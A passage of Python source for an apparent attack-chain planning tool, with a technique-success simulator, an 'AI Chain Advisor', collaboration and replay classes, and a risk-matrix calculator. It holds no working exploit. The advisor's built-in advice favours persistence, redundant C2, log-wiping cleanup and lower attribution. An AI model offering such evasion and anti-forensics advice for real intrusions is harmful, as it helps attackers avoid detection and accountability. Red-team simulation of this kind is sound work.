        'phishing': {'base_success': 0.65, 'noise': 0.3, 'time_range': (5, 30)},
        'exploit': {'base_success': 0.70, 'noise': 0.6, 'time_range': (1, 10)},
        'brute_force': {'base_success': 0.40, 'noise': 0.8, 'time_range': (30, 180)},
        'social_engineering': {'base_success': 0.55, 'noise': 0.2, 'time_range': (15, 60)},
        'malware': {'base_success': 0.75, 'noise': 0.5, 'time_range': (2, 15)},
        'lateral_movement': {'base_success': 0.60, 'noise': 0.4, 'time_range': (5, 30)},
        'privilege_escalation': {'base_success': 0.50, 'noise': 0.5, 'time_range': (5, 20)},
        'exfiltration': {'base_success': 0.80, 'noise': 0.7, 'time_range': (10, 60)},
        'persistence': {'base_success': 0.85, 'noise': 0.3, 'time_range': (2, 10)},
        'c2_communication': {'base_success': 0.70, 'noise': 0.6, 'time_range': (1, 5)},
    }
    
    def __init__(self):
        self.simulation_running = False
        self.current_step = 0
        self.simulation_log: List[Dict] = []
        self.active_factors: Set[str] = set()
        self.random_seed: Optional[int] = None
        
    def configure_environment(self, factors: List[str]) -> Dict:
        """Configure environmental factors for simulation"""
        self.active_factors = set(factors)
        total_impact = sum(
            self.ENVIRONMENTAL_FACTORS[f]['impact'] 
            for f in factors if f in self.ENVIRONMENTAL_FACTORS
        )
        return {
            'factors': factors,
            'total_impact': total_impact,
            'effective_modifier': max(0.1, 1.0 + total_impact)
        }
    
    def simulate_node(self, node: Dict, environment_modifier: float = 1.0) -> Dict:
        """Simulate execution of a single node"""
        import random
        
        node_type = node.get('type', 'exploit')
        technique = self.TECHNIQUE_MODIFIERS.get(node_type, self.TECHNIQUE_MODIFIERS['exploit'])
        
        # Calculate success probability
        base_prob = technique['base_success']
        modified_prob = base_prob * environment_modifier
        
        # Add randomness
        variance = random.uniform(-0.1, 0.1)
        final_prob = max(0.05, min(0.95, modified_prob + variance))
        
        # Determine outcome
        roll = random.random()
        success = roll < final_prob
        
        # Calculate execution time
        time_min, time_max = technique['time_range']
        exec_time = random.uniform(time_min, time_max)
        
        # Calculate noise generated
        noise = technique['noise'] * (0.5 if success else 1.5)
        
        # Detection check
        detection_roll = random.random()
        detected = detection_roll < (noise * 0.5)
        
        return {
            'node_id': node.get('id', 'unknown'),
            'node_name': node.get('name', 'Unknown'),
            'success': success,
            'execution_time_minutes': round(exec_time, 2),
            'detection_probability': round(noise, 2),
            'was_detected': detected,
            'success_probability': round(final_prob, 2),
            'roll': round(roll, 3),
            'timestamp': datetime.now().isoformat(),
            'alerts_generated': random.randint(0, 3) if detected else 0
        }
    
    def simulate_chain(self, nodes: List[Dict], edges: List[Dict]) -> Dict:
        """Simulate entire attack chain execution"""
        import random
        
        self.simulation_log = []
        self.simulation_running = True
        
        # Calculate environment modifier
        env_config = self.configure_environment(list(self.active_factors))
        env_modifier = env_config['effective_modifier']
        
        # Build execution order from edges (topological sort)
        execution_order = self._topological_sort(nodes, edges)
        
        total_time = 0
        successful_nodes = 0
        failed_nodes = 0
        detected_count = 0
        chain_compromised = False
        
        for node in execution_order:
            if chain_compromised:
                self.simulation_log.append({
                    'node_id': node.get('id'),
                    'status': 'skipped',
                    'reason': 'Chain compromised - attack detected'
                })
                continue
            
            result = self.simulate_node(node, env_modifier)
            self.simulation_log.append(result)
            
            total_time += result['execution_time_minutes']
            
            if result['success']:
                successful_nodes += 1
            else:
                failed_nodes += 1
                # Check if failure is critical
                if node.get('critical', False):
                    chain_compromised = True
            
            if result['was_detected']:
                detected_count += 1
                # High detection might compromise chain
                if detected_count >= 3 or random.random() < 0.3:
                    chain_compromised = True
        
        self.simulation_running = False
        
        return {
            'success': successful_nodes == len(execution_order) and not chain_compromised,
            'total_nodes': len(execution_order),
            'successful_nodes': successful_nodes,
            'failed_nodes': failed_nodes,
            'skipped_nodes': len(execution_order) - successful_nodes - failed_nodes,
            'total_time_minutes': round(total_time, 2),
            'detection_events': detected_count,
            'chain_compromised': chain_compromised,
            'environment_modifier': env_modifier,
            'simulation_log': self.simulation_log
        }
    
    def _topological_sort(self, nodes: List[Dict], edges: List[Dict]) -> List[Dict]:
        """Sort nodes in execution order based on dependencies"""
        node_map = {n.get('id', str(i)): n for i, n in enumerate(nodes)}
        in_degree = {n.get('id', str(i)): 0 for i, n in enumerate(nodes)}
        adjacency = {n.get('id', str(i)): [] for i, n in enumerate(nodes)}
        
        for edge in edges:
            src, dst = edge.get('source'), edge.get('target')
            if src in adjacency and dst in in_degree:
                adjacency[src].append(dst)
                in_degree[dst] += 1
        
        queue = [nid for nid, deg in in_degree.items() if deg == 0]
        result = []
        
        while queue:
            nid = queue.pop(0)
            if nid in node_map:
                result.append(node_map[nid])
            for neighbor in adjacency.get(nid, []):
                in_degree[neighbor] -= 1
                if in_degree[neighbor] == 0:
                    queue.append(neighbor)
        
        return result


# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# AI CHAIN ADVISOR - Intelligent recommendations for chain optimization
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

class AIChainAdvisor:
    """
    AI-powered chain analysis and recommendations using pattern matching,
    heuristics, and best practices from real-world attack frameworks
    """
    
    # Attack pattern templates for analysis
    ATTACK_PATTERNS = {
        'apt_pattern': {
            'phases': ['recon', 'weaponization', 'delivery', 'exploitation', 
                      'installation', 'c2', 'actions'],
            'description': 'APT-style persistent attack pattern',
            'recommendations': [
                'Ensure C2 redundancy with multiple channels',
                'Add persistence mechanisms after initial access',
                'Include lateral movement for network coverage'
            ]
        },
        'smash_grab': {
            'phases': ['recon', 'exploit', 'exfil'],
            'description': 'Quick smash-and-grab pattern',
            'recommendations': [
                'Minimize dwell time to avoid detection',
                'Use fast exfiltration methods',
                'Consider anti-forensics cleanup'
            ]
        },
        'living_off_land': {
            'phases': ['access', 'discovery', 'collection', 'exfil'],
            'description': 'Living off the land with native tools',
            'recommendations': [
                'Use built-in system tools exclusively',
                'Avoid dropping custom binaries',
                'Blend with normal admin activity'
            ]
        }
    }
    
    # Common chain issues and fixes
    CHAIN_ISSUES = {
        'no_persistence': {
            'condition': lambda nodes: not any('persist' in n.get('type', '').lower() for n in nodes),
            'severity': 'high',
            'issue': 'No persistence mechanism detected',
            'fix': 'Add persistence node after initial access to maintain foothold'
        },
        'no_cleanup': {
            'condition': lambda nodes: not any('cleanup' in n.get('type', '').lower() or 
                                              'forensic' in n.get('type', '').lower() for n in nodes),
            'severity': 'medium',
            'issue': 'No anti-forensics or cleanup step',
            'fix': 'Add cleanup node at end to remove artifacts and logs'
        },
        'single_c2': {
            'condition': lambda nodes: sum(1 for n in nodes if 'c2' in n.get('type', '').lower()) <= 1,
            'severity': 'medium',
            'issue': 'Single point of failure for C2',
            'fix': 'Add backup C2 channel for redundancy'
        },
        'no_recon': {
            'condition': lambda nodes: not any('recon' in n.get('type', '').lower() or 
                                              'scan' in n.get('type', '').lower() for n in nodes),
            'severity': 'high',
            'issue': 'Missing reconnaissance phase',
            'fix': 'Add reconnaissance before exploitation to identify targets'
        },
        'linear_chain': {
            'condition': lambda nodes: len(nodes) > 5,  # Will check edges separately
            'severity': 'low',
            'issue': 'Linear chain with no parallel paths',
            'fix': 'Consider parallel attack paths for resilience'
        }
    }
    
    def __init__(self):
        self.analysis_cache: Dict = {}
        
    def analyze_chain(self, nodes: List[Dict], edges: List[Dict]) -> Dict:
        """Perform comprehensive chain analysis"""
        analysis = {
            'overall_score': 0,
            'pattern_match': None,
            'issues': [],
            'recommendations': [],
            'strengths': [],
            'kill_chain_coverage': {},
            'risk_assessment': {}
        }
        
        # Detect attack pattern
        analysis['pattern_match'] = self._detect_pattern(nodes)
        
        # Check for issues
        for issue_id, issue_def in self.CHAIN_ISSUES.items():
            try:
                if issue_def['condition'](nodes):
                    analysis['issues'].append({
                        'id': issue_id,
                        'severity': issue_def['severity'],
                        'issue': issue_def['issue'],
                        'fix': issue_def['fix']
                    })
            except Exception:
                pass
        
        # Analyze kill chain coverage
        analysis['kill_chain_coverage'] = self._analyze_kill_chain(nodes)
        
        # Generate recommendations
        analysis['recommendations'] = self._generate_recommendations(nodes, edges, analysis)
        
        # Identify strengths
        analysis['strengths'] = self._identify_strengths(nodes, edges)
        
        # Calculate overall score
        analysis['overall_score'] = self._calculate_score(analysis)
        
        # Risk assessment
        analysis['risk_assessment'] = self._assess_risk(nodes, edges)
        
        return analysis
    
    def _detect_pattern(self, nodes: List[Dict]) -> Optional[Dict]:
        """Detect which attack pattern the chain matches"""
        node_types = [n.get('type', '').lower() for n in nodes]
        
        best_match = None
        best_score = 0
        
        for pattern_id, pattern in self.ATTACK_PATTERNS.items():
            matches = sum(1 for phase in pattern['phases'] 
                         if any(phase in nt for nt in node_types))
            score = matches / len(pattern['phases'])
            
            if score > best_score:
                best_score = score
                best_match = {
                    'pattern_id': pattern_id,
                    'match_score': round(score, 2),
                    'description': pattern['description'],
                    'recommendations': pattern['recommendations']
                }
        
        return best_match if best_score > 0.3 else None
    
    def _analyze_kill_chain(self, nodes: List[Dict]) -> Dict:
        """Analyze coverage of cyber kill chain phases"""
        kill_chain_phases = {
            'reconnaissance': ['recon', 'scan', 'osint', 'enum'],
            'weaponization': ['payload', 'exploit', 'weapon'],
            'delivery': ['phish', 'email', 'usb', 'web'],
            'exploitation': ['exploit', 'vuln', 'rce', 'injection'],
            'installation': ['install', 'persist', 'backdoor', 'implant'],
            'command_control': ['c2', 'beacon', 'callback', 'command'],
            'actions_objectives': ['exfil', 'ransom', 'destroy', 'collect']
        }
        
        coverage = {}
        for phase, keywords in kill_chain_phases.items():
            matching_nodes = [
                n for n in nodes 
                if any(kw in n.get('type', '').lower() or 
                      kw in n.get('name', '').lower() for kw in keywords)
            ]
            coverage[phase] = {
                'covered': len(matching_nodes) > 0,
                'node_count': len(matching_nodes),
                'nodes': [n.get('name', 'Unknown') for n in matching_nodes[:3]]
            }
        
        return coverage
    
    def _generate_recommendations(self, nodes: List[Dict], edges: List[Dict], 
                                  analysis: Dict) -> List[Dict]:
        """Generate intelligent recommendations"""
        recs = []
        
        # Based on issues
        for issue in analysis.get('issues', []):
            recs.append({
                'priority': 'high' if issue['severity'] == 'high' else 'medium',
                'type': 'fix_issue',
                'recommendation': issue['fix'],
                'related_issue': issue['id']
            })
        
        # Based on kill chain gaps
        for phase, data in analysis.get('kill_chain_coverage', {}).items():
            if not data.get('covered'):
                recs.append({
                    'priority': 'medium',
                    'type': 'coverage_gap',
                    'recommendation': f"Add {phase.replace('_', ' ')} phase for complete kill chain",
                    'phase': phase
                })
        
        # Chain structure recommendations
        if len(nodes) > 10 and len(edges) < len(nodes):
            recs.append({
                'priority': 'low',
                'type': 'structure',
                'recommendation': 'Consider adding parallel paths for attack resilience'
            })
        
        # Pattern-based recommendations
        if analysis.get('pattern_match'):
            for rec in analysis['pattern_match'].get('recommendations', []):
                recs.append({
                    'priority': 'medium',
                    'type': 'pattern_based',
                    'recommendation': rec
                })
        
        return recs[:10]  # Top 10 recommendations
    
    def _identify_strengths(self, nodes: List[Dict], edges: List[Dict]) -> List[str]:
        """Identify chain strengths"""
        strengths = []
        
        if len(nodes) >= 5:
            strengths.append("Comprehensive attack chain with multiple stages")
        
        # Check for redundancy
        node_types = [n.get('type', '') for n in nodes]
        if len(node_types) != len(set(node_types)):
            strengths.append("Redundant attack paths for resilience")
        
        # Check for persistence
        if any('persist' in t.lower() for t in node_types):
            strengths.append("Persistence mechanism included")
        
        # Check for stealth
        if any('evas' in t.lower() or 'stealth' in t.lower() for t in node_types):
            strengths.append("Evasion techniques incorporated")
        
        # Check for data collection
        if any('exfil' in t.lower() or 'collect' in t.lower() for t in node_types):
            strengths.append("Data collection/exfiltration capability")
        
        return strengths
    
    def _calculate_score(self, analysis: Dict) -> int:
        """Calculate overall chain score (0-100)"""
        score = 70  # Base score
        
        # Deduct for issues
        for issue in analysis.get('issues', []):
            if issue['severity'] == 'high':
                score -= 15
            elif issue['severity'] == 'medium':
                score -= 8
            else:
                score -= 3
        
        # Add for kill chain coverage
        coverage = analysis.get('kill_chain_coverage', {})
        covered_phases = sum(1 for p in coverage.values() if p.get('covered'))
        score += covered_phases * 5
        
        # Add for pattern match
        if analysis.get('pattern_match'):
            score += int(analysis['pattern_match']['match_score'] * 10)
        
        # Add for strengths
        score += len(analysis.get('strengths', [])) * 3
        
        return max(0, min(100, score))
    
    def _assess_risk(self, nodes: List[Dict], edges: List[Dict]) -> Dict:
        """Assess overall risk profile of the chain"""
        return {
            'detection_risk': self._calc_detection_risk(nodes),
            'complexity_risk': min(1.0, len(nodes) * 0.1),
            'failure_risk': self._calc_failure_risk(nodes, edges),
            'attribution_risk': 0.3 if any('cleanup' in n.get('type', '').lower() for n in nodes) else 0.7,
            'overall_risk': 'medium'
        }
    
    def _calc_detection_risk(self, nodes: List[Dict]) -> float:
        noisy_types = ['brute', 'scan', 'spray', 'flood']
        noisy_count = sum(1 for n in nodes if any(t in n.get('type', '').lower() for t in noisy_types))
        return min(1.0, noisy_count * 0.2)
    
    def _calc_failure_risk(self, nodes: List[Dict], edges: List[Dict]) -> float:
        # Linear chains have higher failure risk
        if len(edges) == len(nodes) - 1:
            return 0.6
        return 0.3


# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# LIVE COLLABORATION SYSTEM - Real-time multi-user chain editing
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

class CollaborationSession:
    """
    Real-time collaboration session for team-based chain building
    """
    
    def __init__(self, session_id: str, owner: str):
        self.session_id = session_id
        self.owner = owner
        self.participants: Dict[str, Dict] = {owner: {'role': 'owner', 'cursor': None, 'color': '#00ff00'}}
        self.chat_messages: List[Dict] = []
        self.change_history: List[Dict] = []
        self.locks: Dict[str, str] = {}  # node_id -> user_id
        self.created_at = datetime.now()
        self.last_activity = datetime.now()
        
    def add_participant(self, user_id: str, role: str = 'editor') -> bool:
        """Add a participant to the session"""
        if user_id in self.participants:
            return False
        
        colors = ['#ff6b6b', '#4ecdc4', '#45b7d1', '#96ceb4', '#ffeaa7', '#dfe6e9']
        color = colors[len(self.participants) % len(colors)]
        
        self.participants[user_id] = {
            'role': role,
            'cursor': None,
            'color': color,
            'joined_at': datetime.now().isoformat()
        }
        
        self.chat_messages.append({
            'type': 'system',
            'message': f'{user_id} joined the session',
            'timestamp': datetime.now().isoformat()
        })
        
        return True
    
    def remove_participant(self, user_id: str) -> bool:
        """Remove a participant from the session"""
        if user_id not in self.participants or user_id == self.owner:
            return False
        
        # Release any locks held by this user
        self.locks = {k: v for k, v in self.locks.items() if v != user_id}
        
        del self.participants[user_id]
        
        self.chat_messages.append({
            'type': 'system',
            'message': f'{user_id} left the session',
            'timestamp': datetime.now().isoformat()
        })
        
        return True
    
    def lock_node(self, node_id: str, user_id: str) -> bool:
        """Lock a node for editing by a specific user"""
        if node_id in self.locks and self.locks[node_id] != user_id:
            return False
        self.locks[node_id] = user_id
        return True
    
    def unlock_node(self, node_id: str, user_id: str) -> bool:
        """Unlock a node"""
        if node_id in self.locks and self.locks[node_id] == user_id:
            del self.locks[node_id]
            return True
        return False
    
    def record_change(self, user_id: str, change_type: str, data: Dict) -> None:
        """Record a change made by a user"""
        self.change_history.append({
            'user_id': user_id,
            'change_type': change_type,
            'data': data,
            'timestamp': datetime.now().isoformat()
        })
        self.last_activity = datetime.now()
    
    def send_message(self, user_id: str, message: str) -> None:
        """Send a chat message"""
        self.chat_messages.append({
            'type': 'chat',
            'user_id': user_id,
            'message': message,
            'timestamp': datetime.now().isoformat()
        })
    
    def get_session_state(self) -> Dict:
        """Get current session state"""
        return {
            'session_id': self.session_id,
            'owner': self.owner,
            'participants': list(self.participants.keys()),
            'participant_count': len(self.participants),
            'active_locks': self.locks.copy(),
            'message_count': len(self.chat_messages),
            'change_count': len(self.change_history),
            'created_at': self.created_at.isoformat(),
            'last_activity': self.last_activity.isoformat()
        }


class CollaborationManager:
    """Manage multiple collaboration sessions"""
    
    def __init__(self):
        self.sessions: Dict[str, CollaborationSession] = {}
        self.user_sessions: Dict[str, str] = {}  # user_id -> session_id
    
    def create_session(self, owner: str) -> str:
        """Create a new collaboration session"""
        import uuid
        session_id = f"session_{uuid.uuid4().hex[:8]}"
        self.sessions[session_id] = CollaborationSession(session_id, owner)
        self.user_sessions[owner] = session_id
        return session_id
    
    def join_session(self, session_id: str, user_id: str, role: str = 'editor') -> bool:
        """Join an existing session"""
        if session_id not in self.sessions:
            return False
        
        if self.sessions[session_id].add_participant(user_id, role):
            self.user_sessions[user_id] = session_id
            return True
        return False
    
    def leave_session(self, user_id: str) -> bool:
        """Leave current session"""
        if user_id not in self.user_sessions:
            return False
        
        session_id = self.user_sessions[user_id]
        if session_id in self.sessions:
            self.sessions[session_id].remove_participant(user_id)
        
        del self.user_sessions[user_id]
        return True
    
    def get_session(self, session_id: str) -> Optional[CollaborationSession]:
        """Get a session by ID"""
        return self.sessions.get(session_id)


# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# CHAIN REPLAY & RECORDING - Record and playback chain executions
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

class ChainRecorder:
    """
    Record chain building and execution for playback, training, and analysis
    """
    
    def __init__(self):
        self.recordings: Dict[str, Dict] = {}
        self.current_recording: Optional[str] = None
        self.current_events: List[Dict] = []
        self.recording_start: Optional[datetime] = None
    
    def start_recording(self, name: str) -> str:
        """Start a new recording session"""
        import uuid
        recording_id = f"rec_{uuid.uuid4().hex[:8]}"
        
        self.current_recording = recording_id
        self.current_events = []
        self.recording_start = datetime.now()
        
        self.recordings[recording_id] = {
            'id': recording_id,
            'name': name,
            'status': 'recording',
            'started_at': self.recording_start.isoformat(),
            'events': self.current_events
        }
        
        return recording_id
    
    def record_event(self, event_type: str, data: Dict) -> None:
        """Record an event during the session"""
        if not self.current_recording:
            return
        
        elapsed = (datetime.now() - self.recording_start).total_seconds() if self.recording_start else 0
        
        self.current_events.append({
            'type': event_type,
            'data': data,
            'timestamp': datetime.now().isoformat(),
            'elapsed_seconds': round(elapsed, 3)
        })
    
    def stop_recording(self) -> Optional[Dict]:
        """Stop the current recording"""
        if not self.current_recording:
            return None
        
        recording = self.recordings.get(self.current_recording)
        if recording:
            recording['status'] = 'completed'
            recording['ended_at'] = datetime.now().isoformat()
            recording['duration_seconds'] = (
                datetime.now() - self.recording_start
            ).total_seconds() if self.recording_start else 0
            recording['event_count'] = len(self.current_events)
        
        result = recording
        self.current_recording = None
        self.current_events = []
        self.recording_start = None
        
        return result
    
    def get_recording(self, recording_id: str) -> Optional[Dict]:
        """Get a recording by ID"""
        return self.recordings.get(recording_id)
    
    def list_recordings(self) -> List[Dict]:
        """List all recordings"""
        return [
            {
                'id': r['id'],
                'name': r['name'],
                'status': r['status'],
                'event_count': r.get('event_count', len(r.get('events', []))),
                'duration': r.get('duration_seconds', 0)
            }
            for r in self.recordings.values()
        ]


class ChainPlayer:
    """
    Playback recorded chain sessions
    """
    
    def __init__(self):
        self.current_playback: Optional[Dict] = None
        self.playback_position = 0
        self.playback_speed = 1.0
        self.is_playing = False
        self.is_paused = False
    
    def load_recording(self, recording: Dict) -> bool:
        """Load a recording for playback"""
        if not recording or 'events' not in recording:
            return False
        
        self.current_playback = recording
        self.playback_position = 0
        self.is_playing = False
        self.is_paused = False
        return True
    
    def play(self) -> bool:
        """Start playback"""
        if not self.current_playback:
            return False
        self.is_playing = True
        self.is_paused = False
        return True
    
    def pause(self) -> None:
        """Pause playback"""
        self.is_paused = True
    
    def resume(self) -> None:
        """Resume playback"""
        self.is_paused = False
    
    def stop(self) -> None:
        """Stop playback"""
        self.is_playing = False
        self.is_paused = False
        self.playback_position = 0
    
    def seek(self, position: int) -> bool:
        """Seek to a specific event position"""
        if not self.current_playback:
            return False
        
        events = self.current_playback.get('events', [])
        if 0 <= position < len(events):
            self.playback_position = position
            return True
        return False
    
    def get_next_event(self) -> Optional[Dict]:
        """Get the next event to play"""
        if not self.current_playback or not self.is_playing or self.is_paused:
            return None
        
        events = self.current_playback.get('events', [])
        if self.playback_position >= len(events):
            self.is_playing = False
            return None
        
        event = events[self.playback_position]
        self.playback_position += 1
        return event
    
    def set_speed(self, speed: float) -> None:
        """Set playback speed (0.25x to 4x)"""
        self.playback_speed = max(0.25, min(4.0, speed))
    
    def get_playback_state(self) -> Dict:
        """Get current playback state"""
        events = self.current_playback.get('events', []) if self.current_playback else []
        return {
            'is_playing': self.is_playing,
            'is_paused': self.is_paused,
            'position': self.playback_position,
            'total_events': len(events),
            'speed': self.playback_speed,
            'progress': self.playback_position / len(events) if events else 0
        }


# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# RISK MATRIX HEATMAP - Visual risk assessment
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

class RiskMatrixCalculator:
    """
    Calculate and visualize risk matrix for attack chains
    """
    
    # Risk categories
    RISK_CATEGORIES = {
        'detection': {
            'name': 'Detection Risk',
            'description': 'Likelihood of being detected',
            'weight': 0.25
        },
        'complexity': {
            'name': 'Complexity Risk',
            'description': 'Risk from chain complexity',
            'weight': 0.20
        },
        'dependency': {
            'name': 'Dependency Risk',
            'description': 'Risk from interdependencies',
            'weight': 0.15
        },
        'timing': {
            'name': 'Timing Risk',
            'description': 'Risk from time constraints',
            'weight': 0.15
        },
        'attribution': {
            'name': 'Attribution Risk',
            'description': 'Risk of being attributed',
            'weight': 0.15
        },
        'collateral': {
            'name': 'Collateral Risk',
            'description': 'Risk of unintended damage',
            'weight': 0.10
        }
    }
    
    # Impact levels
    IMPACT_LEVELS = ['negligible', 'low', 'medium', 'high', 'critical']
    
    # Probability levels
    PROBABILITY_LEVELS = ['rare', 'unlikely', 'possible', 'likely', 'certain']
    
    def __init__(self):
        self.risk_scores: Dict[str, Dict] = {}
    
    def calculate_risk_matrix(self, nodes: List[Dict], edges: List[Dict]) -> Dict:
        """Calculate complete risk matrix for the chain"""
        matrix = {}
        
        for category_id, category in self.RISK_CATEGORIES.items():
            score = self._calculate_category_risk(category_id, nodes, edges)
            matrix[category_id] = {
                'name': category['name'],
                'score': score,
                'level': self._score_to_level(score),
                'probability': self._get_probability(score),
                'impact': self._get_impact(category_id, nodes),
                'weight': category['weight']
            }
        
        # Calculate overall risk
        overall_score = sum(
            m['score'] * m['weight'] 
            for m in matrix.values()
        )
        
        return {
            'categories': matrix,
            'overall_score': round(overall_score, 2),
            'overall_level': self._score_to_level(overall_score),
            'risk_rating': self._get_risk_rating(overall_score),
            'heatmap_data': self._generate_heatmap_data(matrix)
        }
    
    def _calculate_category_risk(self, category: str, nodes: List[Dict], 
                                  edges: List[Dict]) -> float:
        """Calculate risk score for a specific category"""
        if category == 'detection':
            # More nodes = more detection risk
            noisy_nodes = sum(1 for n in nodes if n.get('noise_level', 0.5) > 0.6)
            return min(1.0, (len(nodes) * 0.05) + (noisy_nodes * 0.15))
        
        elif category == 'complexity':
            # Complex chains have higher risk
            return min(1.0, len(nodes) * 0.08 + len(edges) * 0.03)
        
        elif category == 'dependency':
            # Linear chains have high dependency risk
            if len(nodes) > 1:
                return min(1.0, (len(edges) / len(nodes)) * 0.7)
            return 0.3
        
        elif category == 'timing':
            # Estimate based on total time
            total_time = sum(n.get('duration', 30) for n in nodes)
            return min(1.0, total_time / 3600)  # Normalize to 1 hour
        
        elif category == 'attribution':
            # Check for cleanup/evasion nodes
            has_cleanup = any('cleanup' in n.get('type', '').lower() for n in nodes)
            has_evasion = any('evas' in n.get('type', '').lower() for n in nodes)
            base = 0.7
            if has_cleanup:
                base -= 0.25
            if has_evasion:
                base -= 0.20
            return max(0.1, base)
        
        elif category == 'collateral':
            # Destructive techniques increase collateral risk
            destructive = ['destroy', 'wipe', 'ransom', 'ddos']
            has_destructive = any(
                any(d in n.get('type', '').lower() for d in destructive)
                for n in nodes
            )
            return 0.8 if has_destructive else 0.2
        
        return 0.5
    
    def _score_to_level(self, score: float) -> str:
        """Convert numeric score to risk level"""
        if score < 0.2:
            return 'negligible'
        elif score < 0.4:
